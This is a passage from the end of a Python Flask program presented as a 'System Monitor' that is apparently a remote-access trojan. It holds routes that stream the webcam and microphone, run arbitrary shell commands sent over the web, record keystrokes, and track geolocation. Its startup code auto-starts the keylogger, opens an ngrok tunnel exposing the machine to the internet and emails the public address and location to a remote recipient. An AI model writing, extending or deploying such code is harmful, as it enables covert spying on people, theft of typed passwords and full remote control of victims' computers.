                }}
            }}

            // Enter key handlers
            document.getElementById('chat-input').addEventListener('keypress', function(e) {{
                if (e.key === 'Enter') {{
                    sendMessage();
                }}
            }});

            document.getElementById('command-input').addEventListener('keypress', function(e) {{
                if (e.key === 'Enter') {{
                    executeCommand();
                }}
            }});

            // Auto-refresh system info every 5 seconds
            setInterval(refreshSystemInfo, 5000);
            setInterval(refreshProcesses, 10000);

            // Auto-refresh keylogs every 3 seconds if keylogger is running
            setInterval(() => {{
                if (document.getElementById('keylogger-status').textContent === 'Running') {{
                    refreshKeylogs();
                }}
            }}, 3000);

            // Initial load
            refreshSystemInfo();
            refreshProcesses();
            refreshLocation();
            refreshKeylogs();
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/video_feed')
def video_feed():
    """Video streaming route"""
    def generate():
        while True:
            frame = camera_manager.get_frame(0)
            if frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.05)
    
    return Response(generate(),
                   mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/audio_feed')
def audio_feed():
    """Audio streaming route"""
    def generate():
        while True:
            if audio_buffer:
                # Get latest audio chunk
                audio_data = audio_buffer[-1]
                yield (b'--frame\r\n'
                       b'Content-Type: audio/wav\r\n\r\n' + audio_data + b'\r\n')
            time.sleep(CHUNK / RATE)
    
    return Response(generate(),
                   mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/start_camera', methods=['POST'])
def start_camera():
    """Start camera"""
    try:
        # Add camera if not exists
        camera_manager.add_camera(0)
        
        if camera_manager.start_camera(0):
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Camera already running or failed to start'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/stop_camera', methods=['POST'])
def stop_camera():
    """Stop camera"""
    try:
        if camera_manager.stop_camera(0):
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Camera not running'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/start_audio', methods=['POST'])
def start_audio():
    """Start audio recording"""
    try:
        if audio_manager.start_recording():
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Failed to start audio recording'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/stop_audio', methods=['POST'])
def stop_audio():
    """Stop audio recording"""
    try:
        if audio_manager.stop_recording():
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Audio not recording'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/send_message', methods=['POST'])
def send_message():
    """Send message to show as popup on host"""
    try:
        data = request.get_json()
        message = data.get('message', '')
        sender = data.get('sender', 'Anonymous')
        
        if message:
            show_popup_notification(message, sender)
            
            # Add to chat history
            chat_messages_deque.append({
                'sender': sender,
                'message': message,
                'timestamp': time.time(),
                'type': 'remote'
            })
            
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Empty message'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/chat_messages')
def get_chat_messages():
    """Get chat messages"""
    messages = list(chat_messages_deque)
    return jsonify({'messages': messages})

@app.route('/system_info')
def get_system_info():
    """Get system information"""
    info = system_monitor.get_system_info()
    return jsonify(info)

@app.route('/processes')
def get_processes():
    """Get running processes"""
    processes = system_monitor.get_running_processes()
    return jsonify(processes)

@app.route('/execute_command', methods=['POST'])
def execute_command():
    """Execute a command and return the output"""
    try:
        data = request.get_json()
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({'success': False, 'error': 'Empty command'})
        
        # Execute the command
        output = command_manager.execute_command(command)
        current_directory = command_manager.get_current_directory()
        
        # Add to command history
        command_history.append({
            'command': command,
            'output': output,
            'timestamp': time.time(),
            'directory': current_directory
        })
        
        return jsonify({
            'success': True,
            'output': output,
            'current_directory': current_directory
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/command_history')
def get_command_history():
    """Get command history"""
    history = list(command_history)
    return jsonify({'history': history})

# New routes for geolocation and keylogger
@app.route('/geolocation')
def get_geolocation():
    """Get geolocation data"""
    location = geo_tracker.get_geolocation()
    if location:
        return jsonify({'success': True, 'location': location})
    else:
        return jsonify({'success': False, 'error': 'Could not fetch location'})

@app.route('/location_map')
def get_location_map():
    """Get Google Maps URL"""
    map_url = geo_tracker.get_google_maps_url()
    if map_url:
        return jsonify({'success': True, 'map_url': map_url})
    else:
        return jsonify({'success': False, 'error': 'No location data available'})

@app.route('/keylog_status')
def get_keylog_status():
    """Get keylogger status"""
    try:
        status = key_logger.get_status()
        return jsonify({'success': True, 'status': status})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/start_keylogger', methods=['POST'])
def start_keylogger():
    """Start keylogger"""
    try:
        if key_logger.start_logging():
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Keylogger already running or failed to start'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/stop_keylogger', methods=['POST'])
def stop_keylogger():
    """Stop keylogger"""
    try:
        if key_logger.stop_logging():
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Keylogger not running'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/keylog_data')
def get_keylog_data():
    """Get keylogger data"""
    try:
        logs = key_logger.get_logs(200)  # Last 200 lines
        status = key_logger.get_status()
        return jsonify({
            'success': True, 
            'logs': logs, 
            'is_running': key_logger.is_logging,
            'status': status
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/clear_keylogs', methods=['POST'])
def clear_keylogs():
    """Clear keylogger data"""
    try:
        if key_logger.clear_logs():
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Failed to clear logs'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/config_status')
def get_config_status():
    """Get configuration status (without revealing actual credentials)"""
    try:
        config_status = {
            'email_configured': bool(EMAIL_CONFIG.get('sender_email') and EMAIL_CONFIG.get('sender_password')),
            'receiver_email_set': bool(EMAIL_CONFIG.get('receiver_email')),
            'ngrok_configured': bool(NGROK_CONFIG.get('auth_token')),
            'port': PORT,
            'auto_start_ngrok': AUTO_START_NGROK,
            'auto_start_keylogger': AUTO_START_KEYLOGGER,
            'security': 'Jetsu Encoded'
        }
        return jsonify({'success': True, 'config': config_status})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def main():
    """Main function to start the application"""
    print("🚀 Starting System Monitor...")
    print(f"📁 Using configuration from: {CONFIG_FILE}")
    print("🔒 Security: Jetsu Encoded Credentials")
    
    # Display configuration summary (without revealing passwords)
    print("\n📋 Configuration Summary:")
    sender_email = EMAIL_CONFIG['sender_email']
    masked_email = sender_email[0] + '*' * (sender_email.find('@') - 2) + sender_email[sender_email.find('@')-1:]
    print(f"   📧 Sender Email: {masked_email}")
    print(f"   📨 Receiver Email: {EMAIL_CONFIG['receiver_email']}")
    print(f"   🌐 Port: {PORT}")
    print(f"   🔗 Auto-start Ngrok: {AUTO_START_NGROK}")
    print(f"   ⌨️  Auto-start Keylogger: {AUTO_START_KEYLOGGER}")
    
    # Check for keylogger dependencies
    try:
        import pynput
        print("✅ pynput installed - keylogger ready")
    except ImportError:
        print("⚠️  pynput not installed - keylogger will auto-install on first use")
    
    # Start popup manager
    popup_manager.start()
    
    # Start audio capture thread
    audio_thread = threading.Thread(target=audio_capture_loop, daemon=True)
    audio_thread.start()

    # Auto-start keylogger if configured
    if AUTO_START_KEYLOGGER:
        print("🔧 Auto-starting keylogger...")
        key_logger.start_logging()

    # Get local IP
    local_ip = get_local_ip()
    print(f"🏠 Local access: http://{local_ip}:{PORT}")
    
    # Start ngrok tunnel if configured
    if AUTO_START_NGROK:
        print("🌐 Starting ngrok tunnel...")
        if ngrok_manager.start_ngrok():
            # Send notification email
            mailer.send(
                subject="System Monitor Started",
                message=f"""
                🚀 System Monitor is now active!
                
                🌐 Wan Mode: {ngrok_manager.public_url}
                🏠 Lan Mode: http://{local_ip}:{PORT}
                
                📍 Location: {geo_tracker.get_geolocation() or 'Unknown'}
                ⏰ Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                """
            )
            print(f"✅ Ngrok started: {ngrok_manager.public_url}")
        else:
            print("❌ Ngrok failed to start")
    else:
        print("ℹ️  Ngrok auto-start disabled in configuration")
    
    # Start Flask app
    print(f"🌐 Starting web server on port {PORT}...")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)

if __name__ == '__main__':
    main()
